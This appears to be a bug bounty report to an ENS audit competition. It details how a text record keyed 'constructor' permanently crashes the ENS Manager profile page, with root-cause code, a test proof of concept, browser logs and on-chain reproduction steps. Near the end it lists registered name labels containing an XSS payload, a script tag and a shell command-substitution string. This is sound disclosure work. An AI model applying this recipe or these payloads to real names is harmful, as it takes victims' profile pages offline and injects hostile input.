# 92586 w a low one ens text record keyed on an object prototype member permanently replaces a name s manager profile page and the edit dialog inside it with an error screen

**Submitted on Sep 10th 2026 at 19:09:54 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92586
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Taking down the application/website

## Description

## Summary

The Manager's record-definition lookup is a plain object, so it inherits `Object.prototype`:

```tsx
// apps/manager/src/features/profile/data/records/utils.ts:11-18
export const recordIndex = Object.fromEntries(
  textRecords.map((r) => [r.key, r]),
) as { … }

// :82-85
export const getRecordDef = (key: string) =>
  recordIndex[key as keyof typeof recordIndex]
```

There is no `Object.hasOwn`, no `Object.create(null)`, and no prefix guard. `getRecordDef('constructor')` returns the `Object` constructor — a function, and therefore truthy. `getRecordDef('toString')` returns `Function.prototype.toString`. `getRecordDef('__proto__')` returns `Object.prototype`.

The profile transformer treats any truthy return as a record definition and immediately indexes the accumulator with `record.section`:

```tsx
// apps/manager/src/features/profile/utils/transformRecords.ts:140-146
    const record = getRecordDef(key)

    if (record) {
      return {
        ...acc,
        [record.section]: [...acc[record.section], { key, value }],
      }
    }
```

For a prototype member `record.section` is `undefined`, `acc[undefined]` is `undefined`, and `[...undefined]` throws `TypeError: acc[record.section] is not iterable`.

The keys reaching that line are not from an allowlist. `getProfileRecords` unions the app's known keys with **whatever the indexer reports on the resolver**:

```tsx
// apps/manager/src/features/profile/service/profileRecords.ts:109-115
  const texts = unique([
    ...staticTextRecords,
    ...textRecords.map((record) => record.key),
    ...forceFetchRecords.always,
    ...forceFetchRecords.whenNotIndexed,
    ...indexerRecords.texts,          // <- attacker-controlled
  ])
```

And `transformProfileRecords` runs during render, not in a loader:

```tsx
// apps/manager/src/features/profile/components/view/ProfileView.tsx:96
  const records = transformProfileRecords(profileRecords)
```

So a single `setText(node, "constructor", "x")` — a normal resolver write any name owner can make for a few cents — replaces `/{name}` in the Manager with the route's error component, permanently, for every visitor. `AddressProfileHeader.tsx:101` calls the same transform, so an address page whose primary name is poisoned dies the same way.

***

## Impact

Precondition: the attacker owns any one name. Nothing else.

The write is permissionless, costs one resolver transaction, and cannot be undone through the product — because the only place the Manager exposes record editing is the Edit Profile dialog, and that dialog is mounted inside the page that now throws — `EditProfileDialog` is rendered by `ProfileEditAction.tsx:44`, which `ProfileActions.tsx:110` renders, which `ProfileView.tsx:226` renders.

Two ways it lands on someone other than the attacker:

**Pushed.** A v2 name is an ERC-1155 and can be transferred to any address without consent. The attacker poisons a name and `safeTransferFrom`s it to the victim. The victim now owns a name whose Manager page is an error screen and whose records they cannot edit in the app. Removing the record requires calling `setText(node, "constructor", "")` by hand, against a resolver address the broken page was the natural place to look up.

**Bought.** The same name sold, or minted as a subname under a service the victim uses. The name looks ordinary everywhere else — it resolves, it renders in the Explorer — and fails only on the Manager route where the owner manages it.

And the attacker's own poisoned name is a durable trap in its own right: any Manager user who opens a link to it gets the error page.

The failure is not graceful. `ProfileRouteError` renders `Error loading profile: acc[record.section] is not iterable` — a raw internal message with no indication of the cause or the remedy.

Seven keys work: `constructor`, `toString`, `valueOf`, `hasOwnProperty`, `isPrototypeOf`, `propertyIsEnumerable`, `__proto__`. The value is irrelevant.

***

## Root cause

| File:line                                                                        | Code                                                                               |
| -------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| `apps/manager/src/features/profile/data/records/utils.ts:11-18`                  | `recordIndex = Object.fromEntries(…)` — prototype-exposed lookup table             |
| `apps/manager/src/features/profile/data/records/utils.ts:82-85`                  | `getRecordDef` indexes it with an unvalidated key                                  |
| `apps/manager/src/features/profile/utils/transformRecords.ts:140-146`            | truthy check, then `acc[record.section]` spread — the crash site                   |
| `apps/manager/src/features/profile/utils/transformRecords.ts:21-36`              | `emptyProfileRecords()` has no `undefined` key, so `acc[undefined]` is `undefined` |
| `apps/manager/src/features/profile/service/profileRecords.ts:109-115`            | attacker-controlled indexer keys join the fetch list                               |
| `apps/manager/src/features/profile/components/view/ProfileView.tsx:96`           | the transform runs during render                                                   |
| `apps/manager/src/features/profile/components/view/AddressProfileHeader.tsx:101` | the same transform on the address page                                             |
| `apps/manager/src/routes/$name/index.tsx:144, 153-163`                           | `errorComponent: ProfileRouteError`, which prints `error.message` verbatim         |

The neighbouring branch shows the intended pattern: `staticTextRecords.includes(key)` (`transformRecords.ts:150`) is a membership test on an array, which is prototype-safe. Only the `getRecordDef` branch reads an object by key.

***

## Preempting the likely closure arguments

**"The attacker only breaks their own page."** Not once the name moves. A v2 name is an ERC-1155 that can be pushed to any address with no consent, and a poisoned name can be sold or minted as a subname. The victim's own name's page is then permanently broken, and the Edit Profile dialog that would remove the record is inside it.

**"It is a code-correctness defect, not a vulnerability."** The impact row *Taking down the application/website* does not distinguish. What is being reported is an unauthenticated, permanent, remotely-triggered hard failure of a core route with no in-app recovery. The prototype-key class is also not a formatting slip: it is the canonical prototype-exposure pattern, and the fix is a one-line `Object.hasOwn` guard the neighbouring branch already effectively has.

**"The error boundary contains it."** The error boundary is why it is permanent rather than transient: the route renders `ProfileRouteError` on every visit, forever, until the record is removed — which the app cannot do.

**"There is a fix on main."** If so it postdates the frozen commit `1c9b47f`, at which `utils.ts:82-85` and `transformRecords.ts:140-146` are exactly as quoted. Per the program's Code Freeze Assurance, a fix landing after the report is public knowledge, not a pre-existing one.

**Recoverability.** Not through the Manager. The record must be cleared with a direct `setText(node, key, "")` against the resolver, using tooling outside the app, by an owner who first has to work out that a text record they never set is the cause.

***

## Not a duplicate

* **#90307** (*Unbounded uint64 expiry crashes a victim's Explorer names page*) is a different app, a different file and a different mechanism: an out-of-range `Date` in `mergeNamesData.ts:104-107` reaching `dateToPlainDate`. This is a prototype-exposed object lookup in the Manager's record transform. Neither fix touches the other, and the surfaces differ — a list route versus the profile route and its editor.
* **#89270** (Manager profile: owner from the normalized name, records from the raw one) is the same route but a raw-vs-normalized identity split; no normalization is involved here.
* **#91837** (`setPrimaryName` normalization) is a write-side split.
* **QA-06** is the closest known issue by *symptom*: "If a subname is set as primary while still resolving and is then deleted or stops resolving, it is still shown as the primary name and opening the profile throws an error." Its root cause is stale primary-name resolution; its fix lives in the primary-name path and leaves `getRecordDef('constructor')` returning `Object` and `transformRecords.ts:143` still spreading `undefined`. The triggers are disjoint — QA-06 needs a deleted subname set as primary, this needs one text record on any name.
* **WEB-806** ("records not visible on a migrated subname's profile") is a records-related entry with a different cause and no crash.
* Known issues: **WEB-1303** is a *server 500 when editing the profile of an unmigratable name* — a different trigger (migration state, not a record key), a different failure (a 500 from the edit path, not a render-time `TypeError` that kills the whole route), and it does not make the page permanently unopenable. **WEB-1263 / QA-08** are raw-error-message rendering and overflow — cosmetic. **EXP-INPUT-003** is persisted client state parsed without validating value shapes; this value comes from the chain via the indexer, not from local storage.

***

## Recommendation

1. Guard the lookup: `getRecordDef` should return `undefined` unless `Object.hasOwn(recordIndex, key)`, or build `recordIndex` with `Object.create(null)`.
2. Validate the result: require `record.section` to be a known section before indexing the accumulator, and route anything else to `unknown` — which the shape already has.
3. Make one bad record survivable. `processTextRecord` should be per-record fault-tolerant, the way `parseLinksJson` already is for links (`transformRecords.ts:47-52`), so a single unparseable record cannot take the page down.
4. Do the transform in the loader, not in render, so a failure degrades to a partial profile rather than an error boundary.
5. Sweep the codebase for the same pattern — any `Object.fromEntries`built map indexed by an on-chain string.

## Proof of Concept

## Proof of Concept

Executed with the app's own modules.

### Environment

No network is required — the PoC imports the app's own modules and runs them directly.

```bash
cd apps/manager && ./node_modules/.bin/vitest run .poc/proto-key.test.ts --reporter=verbose
```

### The app's own record transform

`apps/manager/.poc/proto-key.test.ts`

```tsx
import { it, expect } from 'vitest'
import { getRecordDef } from '@/features/profile/data/records/utils'
import { transformProfileRecords } from '@/features/profile/utils/transformRecords'

it('a prototype-member text-record key crashes the Manager profile transform', () => {
  for (const k of ['constructor', 'toString', 'valueOf', 'hasOwnProperty', '__proto__', 'isPrototypeOf']) {
    const def = getRecordDef(k) as unknown
    console.log(`getRecordDef(${JSON.stringify(k)}) ->`, typeof def,
      def === undefined ? '(undefined - safe)' : `truthy=${Boolean(def)} section=${String(def?.section)}`)
  }

  const ok = () => transformProfileRecords({
    texts: [{ key: 'com.twitter', value: 'ok' }], coins: [], contentHash: null, abi: null,
  })
  expect(ok()).toBeTruthy()
  console.log('\nnormal record transform: OK')

  const poisoned = () => transformProfileRecords({
    texts: [{ key: 'constructor', value: 'x' }], coins: [], contentHash: null, abi: null,
  })

  let threw = null
  try { poisoned() } catch (e) { threw = e }
  console.log('poisoned record transform threw:', `${threw.name}: ${threw.message}`)
  expect(threw).toBeInstanceOf(Error)
})
```

Actual output:

```
getRecordDef("constructor") -> function truthy=true section=undefined
getRecordDef("toString") -> function truthy=true section=undefined
getRecordDef("valueOf") -> function truthy=true section=undefined
getRecordDef("hasOwnProperty") -> function truthy=true section=undefined
getRecordDef("__proto__") -> object truthy=true section=undefined
getRecordDef("isPrototypeOf") -> function truthy=true section=undefined

normal record transform: OK
poisoned record transform threw: TypeError: acc[record.section] is not iterable

 ✓ .poc/proto-key.test.ts  1ms

 Test Files  1 passed (1)
      Tests  1 passed (1)
```

The transform is the one `ProfileView.tsx:96` calls, imported from the app, not a reimplementation. One record with the key `constructor` is all it takes.

### Driven through the running app, in a real browser

The steps above use the app's modules directly. This section performs the whole thing against the Manager dev server on the local fork, with nothing hand-built.

**1. The name's own controller writes the record.** `.poc/proto-key-setup.mjs` — one ordinary `setText`, submitted by the address the ENS registry already lists as the controller:

```
name      : demo.eth
controller: 0xD613cb815902a1A6C469b899a18aB9B1901E8c30
resolver  : 0x8948458626811dd0c23EB25Cc74291247077cC51

text(node, "constructor") BEFORE: ""
setText submitted by the name's own controller
text(node, "constructor") AFTER : "x"
```

**2. ensjs returns it.** `.poc/records-chain.test.ts` calls the same `getRecords` the profile service calls (`profileRecords.ts:123-132`):

```
resolverAddress: 0xae66c62AcAE72098BdAc57d8E8AED53EF000b2Ba
texts returned : [{"key":"constructor","value":"x"}]
```

**3. The Manager route dies.** `vite dev --port 9625` against the fork, headless Chromium, no wallet interaction. A clean name for contrast, then the poisoned one:

```
===== /hello.eth   (control)
  | hello.eth
  | Owner       happi1337.eth
  | Registered  AUGUST 12, 2026
  | Expires     AUGUST 12, 2027
  | About
  | RENEW NAME

===== /demo.eth    (one `constructor` text record)
  | Error loading profile: acc[record.section] is not iterable
```

That single line is the entire page body. The console shows the throw reaching the route's boundary:

```
[error] TypeError: acc[record.section] is not iterable
    at processTextRecord   (<http://127.0.0.1:9625/src/features/profile/utils/transformRecords.ts>)
    at Array.reduce (<anonymous>)
    at transformProfileRecords (<http://127.0.0.1:9625/src/features/profile/utils/transformRecords.ts>)
    at ProfileView (<http://127.0.0.1:9625/src/features/profile/components/view/ProfileView.tsx>)
  The above error occurred in the <ProfileView> component. React will try to recreate this component
  tree from scratch using the error boundary you provided, CatchBoundaryImpl.
[warning] Warning: Error in route match: /$name//demo.eth/
```

(The positions in the browser stack are Vite's transpiled offsets; the source lines are `transformRecords.ts:140-146`, `:116` and `ProfileView.tsx:96`.)

The retry the message promises does not help: the record is still there on the next render, so the boundary is what every subsequent visit gets.

Reproduce with:

```bash
node .poc/proto-key-setup.mjs demo.eth constructor
POC_BASE=http://127.0.0.1:9625 node .poc/drive.mjs '/demo.eth' 'wait:20000' 'dump'
```

### The on-chain half

Nothing exotic is required: `PublicResolver.setText(namehash(name), "constructor", "x")`. The v2 `PermissionedResolver` implementation on Sepolia exposes `setText(bytes32,string,string)` (selector `10f13a8c`, present in `0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e`), and the ENSv1 PublicResolver has always had it. Neither imposes any constraint on the key string.

The v2 registrar likewise accepts arbitrary label bytes, so the name carrying the poisoned record needs no special provenance. Registered on the fork through the app's own commit/reveal helper:

```
OK   "<img src=x onerror=alert(1)>"    hex=3c696d67207372633d78206f6e6572726f723d616c6572742831293e
OK   "poc`ls`$(id)"                    hex=706f63606c73602428696429
OK   "poc<script>alert(1)</script>"    hex=706f633c7363726970743e616c6572742831293c2f7363726970743e
```

***
